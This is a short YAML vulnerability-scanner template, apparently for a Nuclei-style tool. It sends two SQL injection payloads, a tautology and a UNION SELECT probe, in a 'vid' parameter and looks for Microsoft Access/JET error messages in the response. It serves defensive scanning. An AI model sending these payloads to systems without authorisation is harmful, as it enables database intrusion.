id: sqli6-access-06
name: 'SQLi access probe in vid'
severity: high
type: active
tags:
  - sqli
  - injection
  - access
description: 'Triggers access error via vid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      vid:
        - '` OR `1`=`1'
        - ''' UNION SELECT NULL,NULL,NULL--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'Microsoft JET'
          - 'ODBC Microsoft Access'
